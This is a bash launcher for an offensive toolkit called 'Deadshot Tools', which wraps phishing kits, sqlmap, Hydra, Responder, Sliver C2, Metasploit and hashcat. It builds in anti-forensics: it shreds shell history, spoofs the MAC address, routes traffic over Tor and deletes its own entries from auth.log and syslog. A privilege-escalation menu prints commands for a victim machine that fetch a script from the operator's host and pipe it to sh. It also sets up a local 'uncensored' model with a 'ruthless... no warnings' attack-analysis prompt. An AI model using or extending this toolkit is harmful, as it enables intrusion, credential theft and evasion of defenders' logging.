#!/bin/bash

# ==========================================
# Core Project: Deadshot Tools (V7)
# Developer: NE0SYNC
# ==========================================

export NEWT_COLORS='
    root=,black
    window=,black
    border=red,black
    shadow=,black
    button=black,red
    actbutton=white,red
    compactbutton=black,red
    title=red,black
    roottext=white,black
    textbox=white,black
    actlistbox=black,red
    listbox=white,black
'

RED='\033[31;40;1m'
DARK_GRAY='\033[1;30m'
NC='\033[0m'

SCRIPT_DIR="$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" && pwd -P)"
TOOLS_DIR="${SCRIPT_DIR}/Tools"

# Source the external configuration if it exists
if [ -f "$SCRIPT_DIR/deadshot.conf" ]; then
    source "$SCRIPT_DIR/deadshot.conf"
fi

# ==========================================
# PRE-FLIGHT SYSTEM CHECKS
# ==========================================
if [ "$EUID" -ne 0 ]; then
    echo -e "${RED}[!] EXECUTION BLOCKED: Root privileges required.${NC}"
    echo -e "${DARK_GRAY}[*] Please run the script using: sudo ./deadshot.sh${NC}"
    exit 1
fi

ORIGINAL_MAC_IFACE=""

# ==========================================
# SPLASH SCREEN
# ==========================================
ascii_banner() {
    clear
    echo -e "${RED}"
    echo '    ____  _________    ____  _____ __  ______  ______'
    echo '   / __ \/ ____/   |  / __ \/ ___// / / / __ \/_  __/'
    echo '  / / / / __/ / /| | / / / /\__ \/ /_/ / / / / / /   '
    echo ' / /_/ / /___/ ___ |/ /_/ /___/ / __  / /_/ / / /    '
    echo '/_____/_____/_/  |_/_____//____/_/ /_/\____/ /_/     '
    echo ""
    echo -e "${DARK_GRAY}             [ D E A D S H O T   T O O L S   V 7 ]${NC}"
    echo -e "${DARK_GRAY}            +---------------------------------------+${NC}"
    echo -e "${DARK_GRAY}            |          S E C U R I T Y   A I        |${NC}"
    echo -e "${DARK_GRAY}            +---------------------------------------+${NC}"
    echo ""
    sleep 2
}

# ==========================================
# ADVANCED OPSEC: UA ROTATION & JITTER
# ==========================================
USER_AGENTS=(
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2.1 Safari/605.1.15"
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1"
)
RANDOM_UA=${USER_AGENTS[$RANDOM % ${#USER_AGENTS[@]}]}
JITTER_SEC="0.$(($RANDOM % 9 + 1))"

# ==========================================
# TEAR-DOWN & CLEANUP
# ==========================================
clean_exit() {
    clear
    echo -e "${DARK_GRAY}[*] Initiating tear-down sequence...${NC}"
    
    if command -v tor >/dev/null; then
        echo -e "${DARK_GRAY}[*] Stopping Tor proxy service...${NC}"
        sudo service tor stop >/dev/null 2>&1
    fi

    if [ -n "$ORIGINAL_MAC_IFACE" ]; then
        if command -v macchanger >/dev/null; then
            echo -e "${DARK_GRAY}[*] Restoring original hardware MAC on $ORIGINAL_MAC_IFACE...${NC}"
            sudo ip link set dev "$ORIGINAL_MAC_IFACE" down
            sudo macchanger -p "$ORIGINAL_MAC_IFACE" >/dev/null 2>&1
            sudo ip link set dev "$ORIGINAL_MAC_IFACE" up
        fi
    fi

    # The Silencer: Clean surgical occurrences from system auth logs
    echo -e "${DARK_GRAY}[*] Scrubbing host syslog / auth traces...${NC}"
    sudo sed -i '/deadshot/d' /var/log/auth.log 2>/dev/null
    sudo sed -i '/deadshot/d' /var/log/syslog 2>/dev/null
    echo -e "${DARK_GRAY}[+] Operations concluded cleanly. Exit.${NC}"
    exit 0
}

# ==========================================
# ANTI-FORENSICS & OPSEC (INITIALIZATION)
# ==========================================
anti_forensics() {
    ascii_banner
    echo -e "${DARK_GRAY}[*] Initializing OPSEC protocols...${NC}"
    sleep 1
    
    export HISTFILE=/dev/null
    unset HISTSIZE
    unset HISTFILESIZE

    sudo sh -c "echo 3 > /proc/sys/vm/drop_caches" 2>/dev/null
    sudo sh -c "echo 1 > /proc/sys/vm/oom_dump_tasks" 2>/dev/null
    
    if [ -f ~/.bash_history ]; then
        shred -u ~/.bash_history 2>/dev/null
    fi
    
    IFACE=$(ip route get 8.8.8.8 2>/dev/null | awk '{print $5}' | head -n 1)
    if [ -n "$IFACE" ]; then
        ORIGINAL_MAC_IFACE="$IFACE"
        if command -v macchanger >/dev/null; then
            echo -e "${DARK_GRAY}[*] Spoofing MAC address on interface $IFACE...${NC}"
            sudo ip link set dev "$IFACE" down
            sudo macchanger -r "$IFACE" >/dev/null 2>&1
            sudo ip link set dev "$IFACE" up
        else
            echo -e "${RED}[!] macchanger not found. Install dependencies via Core Menu.${NC}"
        fi
    else
        echo -e "${RED}[!] No external network interface detected. Skipping MAC spoofing.${NC}"
    fi

    echo -e "${DARK_GRAY}[*] Starting local Tor tunnel...${NC}"
    if command -v tor >/dev/null; then
        sudo service tor start >/dev/null 2>&1
    else
        echo -e "${RED}[!] Tor service missing. Install dependencies via Core Menu.${NC}"
    fi

    echo -e "${DARK_GRAY}[+] OPSEC setup complete.${NC}"
    sleep 2
}

if [ -z "$DEADSHOT_OPSEC" ]; then
    anti_forensics
fi

if ! command -v whiptail >/dev/null; then
    sudo apt-get update >/dev/null 2>&1
    sudo apt-get install whiptail -y >/dev/null 2>&1
fi

mkdir -p "$TOOLS_DIR"

prepare_tools_dir() {
    clear
    if ! cd "$TOOLS_DIR"; then
        echo -e "${RED}[!] Critical error: Tools RAM-Disk unavailable.${NC}"
        sleep 2
        return 1
    fi
    return 0
}

pause_menu() {
    cd "$SCRIPT_DIR" || exit
    echo ""
    read -p "Press [ENTER] to return to main menu..."
}

# ==========================================
# AUTO-REPORTING ENGINE
# ==========================================
mkdir -p "$SCRIPT_DIR/Reports"
log_output() {
    local tool_name="$1"
    local timestamp=$(date +"%Y%m%d_%H%M%S")
    local report_file="$SCRIPT_DIR/Reports/${tool_name}_${timestamp}.txt"
    tee "$report_file"
    echo -e "\n${DARK_GRAY}[+] Report Auto-Saved: Reports/${tool_name}_${timestamp}.txt${NC}"
}

# ==========================================
# CORE DEPENDENCIES
# ==========================================
run_requisitos() {
    clear
    echo -e "${DARK_GRAY}[*] Updating system and installing base dependencies...${NC}"
    sudo apt update && sudo apt upgrade -y
    sudo apt install -y git python3 python3-pip python3-venv pipx metasploit-framework curl php tor ruby nmap amass nuclei hydra ffuf wpscan jq macchanger wifite aircrack-ng responder hashcat
    echo -e "${DARK_GRAY}[+] Core requirements installed.${NC}"
    pause_menu
}

# ==========================================
# INPUT SANITIZATION & PYTHON VENV
# ==========================================
sanitize_input() {
    local input="$1"
    # Block shell execution strings
    if [[ "$input" == *[';&|$\><`\']* ]]; then
        return 1
    # Block Flag/Parameter Injection (-oX, -sC, --help)
    elif [[ "$input" == -* ]]; then
        return 1
    fi
    return 0
}

init_virtualenv() {
    if [ ! -d ".venv_deadshot" ]; then
        echo -e "${DARK_GRAY}[*] Initializing isolated Python virtual environment...${NC}"
        python3 -m venv ".venv_deadshot"
    fi
    source ".venv_deadshot/bin/activate"
}

run_zphisher() {
    prepare_tools_dir || return
    if [ ! -d "zphisher" ]; then git clone https://github.com/htr-tech/zphisher; fi
    cd zphisher && bash zphisher.sh; pause_menu
}

run_camphish() {
    prepare_tools_dir || return
    if [ ! -d "CamPhish" ]; then git clone https://github.com/techchipnet/CamPhish; fi
    cd CamPhish && bash camphish.sh; pause_menu
}

run_amass() {
    prepare_tools_dir || return
    read -p "Target Domain (e.g., example.com): " dom
    if ! sanitize_input "$dom"; then echo -e "${RED}[!] Invalid input.${NC}"; pause_menu; return; fi
    if command -v amass >/dev/null; then amass enum -d "$dom"; else echo -e "${RED}[!] Amass not found.${NC}"; fi
    pause_menu
}

run_theharvester() {
    prepare_tools_dir || return
    init_virtualenv
    if [ ! -d "theHarvester" ]; then git clone https://github.com/laramies/theHarvester.git; fi
    cd theHarvester
    pip install -r requirements/base.txt 2>/dev/null
    read -p "Target Domain (e.g., example.com): " dom
    if ! sanitize_input "$dom"; then echo -e "${RED}[!] Invalid input.${NC}"; deactivate; pause_menu; return; fi
    python3 theHarvester.py -d "$dom" -b all | log_output "TheHarvester"
    deactivate
    pause_menu
}

run_sqlmap() {
    prepare_tools_dir || return
    if [ ! -d "sqlmap-dev" ]; then git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev; fi
    cd sqlmap-dev
    read -p "Target URL with parameter (e.g., example.com/page.php?id=1): " alvo
    if ! sanitize_input "$alvo"; then echo -e "${RED}[!] Invalid input.${NC}"; pause_menu; return; fi
    python3 sqlmap.py -u "$alvo" --dbs --random-agent --batch
    pause_menu
}

run_phoneinfoga() {
    prepare_tools_dir || return
    if [ ! -d "PhoneInfoga_App" ]; then mkdir PhoneInfoga_App; fi
    cd PhoneInfoga_App
    if [ ! -f "phoneinfoga" ]; then curl -sSL https://raw.githubusercontent.com/sundowndev/phoneinfoga/master/support/scripts/install | bash; fi
    read -p "Target Phone Number (+123...): " phnum
    if ! sanitize_input "$phnum"; then echo -e "${RED}[!] Invalid input.${NC}"; pause_menu; return; fi
    if [ -n "$phnum" ]; then ./phoneinfoga scan -n "$phnum"; fi
    pause_menu
}

run_sherlock() {
    prepare_tools_dir || return
    init_virtualenv
    if [ ! -d "sherlock" ]; then git clone https://github.com/sherlock-project/sherlock.git; fi
    cd sherlock
    pip install -r requirements.txt 2>/dev/null
    read -p "Target Username: " uname
    if ! sanitize_input "$uname"; then echo -e "${RED}[!] Invalid input.${NC}"; deactivate; pause_menu; return; fi
    if [ -n "$uname" ]; then python3 sherlock "$uname"; fi
    deactivate
    pause_menu
}

run_nuclei() {
    prepare_tools_dir || return
    read -p "Target IP/Domain (https://example.com): " tg
    if ! sanitize_input "$tg"; then echo -e "${RED}[!] Invalid input.${NC}"; pause_menu; return; fi
    if command -v nuclei >/dev/null; then
        # Evasion Tactics: Rate limiting and Random User-Agent
        nuclei -u "$tg" -rl "${NUCLEI_RATE_LIMIT:-150}" -H "User-Agent: $RANDOM_UA" | log_output "Nuclei"
    else 
        echo -e "${RED}[!] Nuclei not found.${NC}"
    fi
    pause_menu
}

run_nikto() {
    prepare_tools_dir || return
    if [ ! -d "nikto" ]; then git clone https://github.com/sullo/nikto.git; fi
    cd nikto
    read -p "Target Web Server URL: " urlt
    if ! sanitize_input "$urlt"; then echo -e "${RED}[!] Invalid input.${NC}"; pause_menu; return; fi
    perl program/nikto.pl -h "$urlt"
    pause_menu
}

run_wpscan() {
    prepare_tools_dir || return
    read -p "Target WordPress URL: " wp_url
    if command -v wpscan >/dev/null; then wpscan --url "$wp_url" --enumerate u,vp,vt; else echo -e "${RED}[!] WPScan not found.${NC}"; fi
    pause_menu
}

run_rustscan() {
    prepare_tools_dir || return
    if ! command -v rustscan >/dev/null; then
        wget -qO rustscan.deb https://github.com/RustScan/RustScan/releases/download/2.0.1/rustscan_2.0.1_amd64.deb
        sudo dpkg -i rustscan.deb
    fi
    read -p "Target IP for fast scanning: " t_ip
    if ! sanitize_input "$t_ip"; then echo -e "${RED}[!] Invalid input.${NC}"; pause_menu; return; fi
    
    rustscan -a "$t_ip" -- -A -sC "${DEFAULT_NMAP_PORTS:--p-}" | log_output "RustScan"
    pause_menu
}

run_hydra() {
    prepare_tools_dir || return
    read -p "Wordlist path (e.g., /usr/share/wordlists/rockyou.txt): " wordl
    read -p "Target User: " usr
    read -p "Target Protocol & URL (e.g., ssh://192.168.1.1): " target_f
    if command -v hydra >/dev/null; then hydra -l "$usr" -P "$wordl" "$target_f"; else echo -e "${RED}[!] Hydra not found.${NC}"; fi
    pause_menu
}

run_ffuf() {
    prepare_tools_dir || return
    read -p "Target URL ending with FUZZ (e.g., http://example.com/FUZZ): " fz_site
    read -p "Directory wordlist path: " dir_w
    if command -v ffuf >/dev/null; then 
        # Tactic JITTER: Obfuscates timing and signatures to bypass WAF logic loops
        ffuf -w "$dir_w" -u "$fz_site" -H "User-Agent: $RANDOM_UA" -p "${DEFAULT_JITTER_SECS:-0.9}" -c | log_output "Ffuf"
    else 
        echo -e "${RED}[!] Ffuf not found.${NC}"
    fi
    pause_menu
}

run_seeker() {
    prepare_tools_dir || return
    if [ ! -d "seeker" ]; then git clone https://github.com/thewhiteh4t/seeker.git; fi
    cd seeker
    bash install.sh
    python3 seeker.py
    pause_menu
}

run_torproxy() {
    prepare_tools_dir || return
    if [ ! -d "Auto_Tor_IP_changer" ]; then git clone https://github.com/FDX100/Auto_Tor_IP_changer.git; fi
    cd Auto_Tor_IP_changer
    sudo python3 install.py
    aut
    pause_menu
}

run_netexec() {
    prepare_tools_dir || return
    if ! command -v netexec >/dev/null; then
        echo -e "${DARK_GRAY}[*] Installing NetExec via pipx...${NC}"
        pipx install netexec 2>/dev/null || sudo apt install -y netexec
    fi
    read -p "Target Windows Network (e.g., 192.168.1.0/24): " tg_smb
    if ! sanitize_input "$tg_smb"; then echo -e "${RED}[!] Invalid input.${NC}"; pause_menu; return; fi
    if [ -n "$tg_smb" ]; then
        echo -e "${DARK_GRAY}[*] Initiating SMB scanning...${NC}"
        netexec smb "$tg_smb"
    fi
    pause_menu
}

run_sliver() {
    prepare_tools_dir || return
    if [ ! -d "sliver" ]; then
        mkdir sliver; cd sliver
        echo -e "${DARK_GRAY}[*] Downloading Sliver C2 framework...${NC}"
        curl -sL https://github.com/BishopFox/sliver/releases/latest/download/sliver-server_linux -o sliver-server
        chmod +x sliver-server
    else
        cd sliver
    fi
    echo -e "${DARK_GRAY}[*] Loading Sliver Server...${NC}"
    ./sliver-server
    pause_menu
}

run_metasploit() {
    prepare_tools_dir || return
    if command -v msfconsole >/dev/null; then
        echo -e "${DARK_GRAY}[*] Loading Metasploit Framework...${NC}"
        msfconsole -q
    else
        echo -e "${RED}[!] Metasploit not found. Install requirements.${NC}"
    fi
    pause_menu
}

# ==========================================
# PHYSICAL & ELITE POST-EXPLOIT (V9)
# ==========================================
run_wifite() {
    clear
    echo -e "${RED}[!] WARNING: Wifite will put your interface in Monitor Mode!${NC}"
    echo -e "${DARK_GRAY}[*] Internet connection will be dropped during the attack.${NC}"
    sleep 2
    if command -v wifite >/dev/null; then 
        sudo wifite --kil
    else 
        echo -e "${RED}[!] Wifite not found. Run Install Requirements.${NC}"
    fi
    pause_menu
}

run_responder() {
    clear
    read -p "Local Interface to Poison (e.g., eth0, wlan0): " iface_rsp
    if ! sanitize_input "$iface_rsp"; then echo -e "${RED}[!] Invalid input.${NC}"; pause_menu; return; fi
    
    if command -v responder >/dev/null; then
        echo -e "${DARK_GRAY}[*] Flooding LAN & Listening for NTLM Authentication from Windows...${NC}"
        sudo responder -I "$iface_rsp" -dwv
    else
        echo -e "${RED}[!] Responder not found. Run Install Requirements.${NC}"
    fi
    pause_menu
}

run_hashcat() {
    prepare_tools_dir || return
    read -p "Path to the extracted Hash file: " hash_fl
    read -p "Hashcat Mode Type (e.g., 1000 for NTLM, 0 for MD5): " h_mode
    read -p "Wordlist path (e.g., /usr/share/wordlists/rockyou.txt): " h_wlist
    
    if command -v hashcat >/dev/null; then
        echo -e "${DARK_GRAY}[*] Initializing GPU Crackers offline...${NC}"
        hashcat -m "$h_mode" "$hash_fl" "$h_wlist" --force -O | log_output "Hashcat"
    else
        echo -e "${RED}[!] Hashcat not found.${NC}"
    fi
    pause_menu
}

run_peas_server() {
    prepare_tools_dir || return
    echo -e "${DARK_GRAY}[*] Downloading Privilege Escalation Suites (LinPEAS/WinPEAS)...${NC}"
    
    mkdir -p Peas_Payloads
    cd Peas_Payloads
    if [ ! -f "linpeas.sh" ]; then curl -sL https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh; fi
    if [ ! -f "winPEASx64.exe" ]; then curl -sL https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASx64.exe -o winPEASx64.exe; fi
    
    MY_LIP=$(ip route get 8.8.8.8 2>/dev/null | awk '{print $7}')
    echo -e "${RED}\n[!] LAUNCH THIS ON THE VICTIM MACHINE TO ESCALATE PRIVILEGES:${NC}"
    echo -e "${DARK_GRAY}Linux: curl http://$MY_LIP:8080/linpeas.sh | sh${NC}"
    echo -e "${DARK_GRAY}Windows (PS): Invoke-WebRequest -Uri http://$MY_LIP:8080/winPEASx64.exe -OutFile .\winPEAS.exe; .\winPEAS.exe${NC}\n"
    
    echo -e "${DARK_GRAY}[*] Starting Clandestine HTTP Server on port 8080... (Ctrl+C to close)${NC}"
    python3 -m http.server 8080
    cd ..
    pause_menu
}

clean_tools_dir() {
    clear
    if [ -d "$TOOLS_DIR" ] && [ "$TOOLS_DIR" = "${SCRIPT_DIR}/Tools" ]; then
        rm -rf "$TOOLS_DIR"
        mkdir -p "$TOOLS_DIR"
        echo -e "${DARK_GRAY}[+] Tools directory purged safely.${NC}"
    else
        echo -e "${RED}[!] Critical error: invalid tools directory path.${NC}"
    fi
    pause_menu
}

# ==========================================
# BLUE TEAM: ACTIVE DEFENSE SHIELD
# ==========================================
run_shield() {
    clear
    echo -e "${DARK_GRAY}[*] Launching Deadshot Shield (Active Defense)...${NC}"
    bash "$SCRIPT_DIR/deadshot_shield.sh"
    pause_menu
}

# ==========================================
# LOCAL AI ASSISTANT & LIVE INTEL
# ==========================================
run_ai_assistant() {
    clear
    echo -e "${RED}             [ DEADSHOT AI ASSISTANT ]${NC}"
    echo -e "${DARK_GRAY}[*] Initializing local LLM engine...${NC}"
    
    # === PHASE 1: Silent Auto-Install ===
    if ! command -v ollama >/dev/null; then
        echo -e "${DARK_GRAY}[*] Ollama not detected. Auto-installing silently...${NC}"
        curl -fsSL https://ollama.com/install.sh | sh 2>/dev/null
        if ! command -v ollama >/dev/null; then
            echo -e "${RED}[!] Auto-install failed. Check your internet connection.${NC}"
            pause_menu
            return
        fi
        echo -e "${DARK_GRAY}[+] Ollama engine installed successfully.${NC}"
    fi
    
    # === PHASE 2: Background Daemon Ignition ===
    if ! pgrep -x "ollama" >/dev/null; then
        echo -e "${DARK_GRAY}[*] Igniting Ollama daemon in background...${NC}"
        ollama serve >/dev/null 2>&1 &
        sleep 3
    fi
    
    # === PHASE 3: Auto-Pull Model if Missing ===
    if ! ollama list 2>/dev/null | grep -q "dolphin-phi"; then
        echo -e "${DARK_GRAY}[*] Pulling 'dolphin-phi' uncensored model (first run only)...${NC}"
        ollama pull dolphin-phi
    fi
    
    # === PHASE 4: Tactical Context Injection (Last Report) ===
    LATEST_REPORT=""
    if [ -d "$SCRIPT_DIR/Reports" ]; then
        LATEST_REPORT=$(ls -t "$SCRIPT_DIR/Reports"/*.txt 2>/dev/null | head -n 1)
    fi
    
    if [ -n "$LATEST_REPORT" ]; then
        REPORT_NAME=$(basename "$LATEST_REPORT")
        REPORT_SNIPPET=$(head -c 2000 "$LATEST_REPORT")
        echo -e "${RED}[!] TACTICAL CONTEXT LOADED: ${REPORT_NAME}${NC}"
        echo -e "${DARK_GRAY}[*] The AI has ingested your last attack report.${NC}"
        echo -e "${DARK_GRAY}[*] Ask it: 'Analyze the scan results' or 'Find vulnerabilities'${NC}"
        echo -e "${DARK_GRAY}[*] Type /bye to exit the chat.${NC}"
        echo ""
        echo "You are a ruthless Red Team AI analyst inside 'Deadshot O.S.'. The operator just finished an attack. Here is the raw output from their last scan tool. Analyze it for vulnerabilities, weak points, next attack steps. Be direct, tactical, no warnings. Report name: ${REPORT_NAME}. Data: ${REPORT_SNIPPET}" | ollama run dolphin-phi
    else
        echo -e "${DARK_GRAY}[*] No previous reports found. Starting clean chat session.${NC}"
        echo -e "${DARK_GRAY}[*] Type /bye to exit the chat.${NC}"
        echo ""
        ollama run dolphin-phi
    fi
    
    clear
    echo -e "${DARK_GRAY}[*] AI Assistant terminated. Returning to framework.${NC}"
    pause_menu
}

run_live_intel() {
    clear
    if ! command -v jq >/dev/null || ! command -v curl >/dev/null; then
        echo -e "${RED}[!] jq or curl missing. Install core dependencies.${NC}"
        pause_menu
        return
    fi

    echo -e "${DARK_GRAY}[*] Querying sources via Tor SOCKS5...${NC}"
    sleep 2
    
    PROXY_URL="socks5h://127.0.0.1:9050"
    
    echo -e "${RED}\n[=] RECENT CVE EXPLOITS (GITHUB):${NC}"
    curl -x "$PROXY_URL" -s -H "User-Agent: $RANDOM_UA" "https://api.github.com/search/repositories?q=CVE-2024&sort=updated&order=desc" 2>/dev/null | jq -r '.items[0:3] | " [X] \(.name): \(.description)"'
    
    echo -e "${RED}\n[=] ACTIVE PUBLIC BUG BOUNTIES:${NC}"
    curl -x "$PROXY_URL" -s -H "User-Agent: $RANDOM_UA" "https://raw.githubusercontent.com/arkadiyt/bounty-targets-data/main/data/hackerone_data.json" 2>/dev/null | jq -r '.[0:3] | " [+] \(.url)"'
    
    echo -e "\n${DARK_GRAY}[+] Intel gathering complete.${NC}"
    pause_menu
}

# ==========================================
# TEXTUAL UI DISPATCHER (FRONT-END INIT)
# ==========================================
if [ -n "$1" ]; then
    # Function directly called by the Python Dashboard
    "$1" "${@:2}"
    exit 0
fi

# Initializing the Master Dashboard
init_virtualenv
if ! python3 -c "import textual" &>/dev/null; then
    clear
    echo -e "${DARK_GRAY}[*] Bootstrapping UI visual dependencies (Textual TUI)...${NC}"
    pip install textual 2>/dev/null
fi

export DEADSHOT_OPSEC=1 # Ensure child processes bypass OPSEC reset latency
python3 deadshot_ui.py
clean_exit
